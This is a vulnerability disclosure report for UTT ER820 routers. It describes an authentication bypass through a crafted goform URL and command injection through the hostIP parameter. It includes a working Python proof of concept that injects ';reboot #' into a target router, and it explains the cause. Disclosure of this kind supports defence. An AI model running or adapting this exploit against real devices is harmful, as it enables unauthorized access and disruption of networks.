# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers 

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (formStartPktCpt / sub_486DF0)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `formStartPktCpt` (mapped to function `sub_486DF0`, range `0x486f4c-0x486fb0`) which can be reached via an authentication bypass, and then abused for command injection. Remote attackers can inject shell commands via the POST parameter `hostIP`, which is inserted into a `doSystem()` call launching `rawdump`.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    url = base_url.rstrip('/') + '/goform/formStartPktCpt/goform/formWebAuthUserSubmit'
    data = {
        'ifName': 'br0',
        'proto': '1',
        'size': '64',
        'packet_num': '1',
        'hostIP': '1.2.3.4;reboot #',
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: In `websSecurityHandler`, URL substrings `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` trigger a direct dispatch to `websFormHandler`. Thus `/goform/formStartPktCpt/goform/formWebAuthUserSubmit` can be used to bypass authentication.

2. **command injection**: In `sub_486DF0`, the parameter `hostIP` is read via `websGetVar` and copied into a buffer that is later passed as a `%s` argument to `doSystem("rawdump -if %s -type %x -ip %s ... &", ...)` without quoting/escaping. Shell metacharacters in `hostIP` allow attackers to append arbitrary commands.
